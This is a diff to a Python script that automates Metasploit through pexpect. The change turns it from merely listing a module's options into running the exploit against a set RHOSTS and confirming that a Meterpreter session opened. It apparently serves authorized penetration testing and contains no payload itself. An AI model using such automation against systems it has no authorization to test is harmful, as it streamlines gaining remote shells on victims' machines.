@@ -5,17 +5,20 @@ auto_msf.py
 功能：
 - 在啟動並互動 msfconsole 前記錄開始時間（本機時區）
 - 使用 pexpect 啟動 msfconsole，use 指定 module，set RHOSTS
-- 執行 show options 並安全退出
+- 執行 run 並偵測三種結果：
+    1) 直接進入 meterpreter prompt
+    2) 出現 "Meterpreter session N opened"（但仍為 msf >）
+    3) 直接回到 msf > 且沒有 opened 訊息（失敗）
+- 透過 sessions -l 確認 session 是否存在（若捕捉到 opened 訊息）
 - 在結束時記錄結束時間
-- 若在 pexpect capture 的 console 輸出中**沒有**出現 "Meterpreter session 1 opened"，
-  則從 ~/.msf4/logs/framework.log 取出介於開始/結束時間之間的 log 行，並存到 ../data/error_message.txt
+- 根據最終結果列印成功或失敗；若失敗則把期間內的 framework.log 與 console 輸出存到 data/error_message.txt
 
 注意：請在有授權的測試環境執行。僅支援類 Unix（Linux / macOS）環境，需安裝 pexpect。
 
 用法：
     python3 auto_msf.py [module] [rhosts]
 
-預設 module = auxiliary/scanner/ssh/ssh_version
+預設 module = cve1_md3_test2
 預設 rhosts = 192.168.1.114
 """
 
@@ -24,7 +27,6 @@ import sys
 import time
 import re
 from datetime import datetime
-from zoneinfo import ZoneInfo
 import pexpect
 import io
 
@@ -93,15 +95,15 @@ def extract_log_range(log_path, start_dt, end_dt):
         return []
 
     out_lines = []
+    timestamp_last = None
     try:
         with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
             for line in f:
                 ts = parse_log_timestamp(line)
                 if ts is None:
                     # 若該行沒有 timestamp，若已經在區間內就保留（處理多行訊息被換行的情況）
-                    if out_lines and 'timestamp_last' in locals() and timestamp_last is not None:
-                        if timestamp_last >= start_dt and timestamp_last <= end_dt:
-                            out_lines.append(line)
+                    if timestamp_last is not None and timestamp_last >= start_dt and timestamp_last <= end_dt:
+                        out_lines.append(line)
                     continue
                 timestamp_last = ts
                 # 比對（將 start/end 與 ts 視為 naive 本地時間）
@@ -110,6 +112,77 @@ def extract_log_range(log_path, start_dt, end_dt):
     except Exception as e:
         out_lines.append(f"[error reading log file: {e}]\n")
     return out_lines
+
+
+# patterns for detection
+METERPRETER_PROMPT_RE = re.compile(r"meterpreter.*>\s*$", re.IGNORECASE)
+SESSION_OPENED_RE = re.compile(r"Meterpreter session (\d+) opened", re.IGNORECASE)
+MSF_PROMPT_RE = re.compile(PROMPT_REGEX, re.IGNORECASE)
+
+
+def run_and_verify(child, total_timeout=60):
+    """執行 run 並偵測結果；回傳一個 dict 描述狀態。"""
+    child.sendline("run")
+    start = time.time()
+
+    try:
+        idx = child.expect([METERPRETER_PROMPT_RE, SESSION_OPENED_RE, MSF_PROMPT_RE], timeout=total_timeout)
+    except pexpect.TIMEOUT:
+        return {"status": "timeout", "detail": child.before}
+    except pexpect.EOF:
+        return {"status": "eof", "detail": None}
+
+    # 直接進到 meterpreter prompt
+    if idx == 0:
+        # 選擇 background 回 msf
+        child.sendline("background")
+        try:
+            child.expect(MSF_PROMPT_RE, timeout=10)
+        except Exception:
+            pass
+        # 檢查 sessions list
+        child.sendline("sessions -l")
+        child.expect(MSF_PROMPT_RE, timeout=10)
+        sessions_out = child.before
+        return {"status": "ok", "method": "meterpreter_prompt", "sessions_output": sessions_out}
+
+    # 捕捉到 opened 訊息
+    if idx == 1:
+        session_id = child.match.group(1)
+        # 等短暫時間，看是否會切換 prompt
+        try:
+            # 等 3 秒看看是否會切換到 meterpreter prompt
+            j = child.expect([METERPRETER_PROMPT_RE, MSF_PROMPT_RE], timeout=3)
+        except Exception:
+            j = None
+
+        # 無論 prompt 有無改變，都去檢查 sessions -l
+        child.sendline("sessions -l")
+        child.expect(MSF_PROMPT_RE, timeout=10)
+        sessions_out = child.before
+        # 檢查 sessions -l 輸出是否含有該 session id
+        if re.search(rf"\b{re.escape(session_id)}\b", sessions_out):
+            return {"status": "ok", "method": "session_opened", "session": session_id, "sessions_output": sessions_out}
+        else:
+            return {"status": "maybe", "method": "opened_but_not_in_list", "session": session_id, "sessions_output": sessions_out}
+
+    # 直接回到 msf prompt
+    if idx == 2:
+        # 再短暫等待可能的 asynchronous opened 訊息
+        try:
+            k = child.expect([SESSION_OPENED_RE], timeout=10)
+            session_id = child.match.group(1)
+            # 再確認 sessions -l
+            child.sendline("sessions -l")
+            child.expect(MSF_PROMPT_RE, timeout=10)
+            sessions_out = child.before
+            if re.search(rf"\b{re.escape(session_id)}\b", sessions_out):
+                return {"status": "ok", "method": "opened_after_prompt", "session": session_id, "sessions_output": sessions_out}
+            else:
+                return {"status": "maybe", "method": "opened_after_prompt_but_not_in_list", "session": session_id, "sessions_output": sessions_out}
+        except pexpect.TIMEOUT:
+            # 真沒有 session
+            return {"status": "no_session", "detail": child.before}
 
 
 def run_auto_msf(module, rhosts, timeout=120):
@@ -131,7 +204,7 @@ def run_auto_msf(module, rhosts, timeout=120):
         return 1
 
     try:
-        child.expect(re.compile(PROMPT_REGEX), timeout=timeout)
+        child.expect(MSF_PROMPT_RE, timeout=timeout)
     except pexpect.exceptions.TIMEOUT:
         print("[!] timeout waiting for prompt")
         child.close(force=True)
@@ -150,26 +223,25 @@ def run_auto_msf(module, rhosts, timeout=120):
     try:
         print(f"[*] reload all")
         child.sendline(f"reload_all")
-        child.expect(re.compile(PROMPT_REGEX))
+        child.expect(MSF_PROMPT_RE)
 
         print(f"[*] using module: {module}")
         child.sendline(f"use {module}")
-        child.expect(re.compile(PROMPT_REGEX))
+        child.expect(MSF_PROMPT_RE)
 
         print(f"[*] set RHOSTS = {rhosts}")
         child.sendline(f"set RHOSTS {rhosts}")
-        child.expect(re.compile(PROMPT_REGEX))
+        child.expect(MSF_PROMPT_RE)
 
-        print("[*] run exploit")
-        child.sendline("run")
-        child.expect(re.compile(PROMPT_REGEX))
-
-        # 若需要，你可以在此加入其他指令（例如 run 或 check），但本範例避免執行 exploit
+        print("[*] run exploit and detect result...")
+        result = run_and_verify(child, total_timeout=60)
 
     except pexpect.exceptions.TIMEOUT:
         print("[!] timeout during interaction")
+        result = {"status": "error", "detail": "timeout during interaction"}
     except pexpect.exceptions.EOF:
         print("[!] msfconsole EOF during interaction")
+        result = {"status": "error", "detail": "EOF during interaction"}
     finally:
         # 嘗試結束
         try:
@@ -189,12 +261,17 @@ def run_auto_msf(module, rhosts, timeout=120):
     # 取得 pexpect 捕獲的 console 輸出
     console_output = buf.getvalue()
 
-    # 判斷是否出現 "Meterpreter session 1 opened"
-    if "Meterpreter session 1 opened" in console_output:
-        print("[+] found Meterpreter session message in console output")
+    # 根據 result 判斷並輸出
+    status = result.get("status")
+    if status == "ok":
+        # 成功
+        method = result.get("method")
+        session = result.get("session")
+        print(f"[SUCCESS] exploit resulted in session. method={method} session={session}")
         return 0
     else:
-        print("[-] no Meterpreter session message in console output; saving relevant log slice...")
+        print(f"[FAILURE] exploit did not produce a usable session. status={status}")
+        # 如果沒成功則儲存 log 範圍
         save_log_slice_if_no_meterpreter(start_dt, end_dt, buf)
         return 4
 
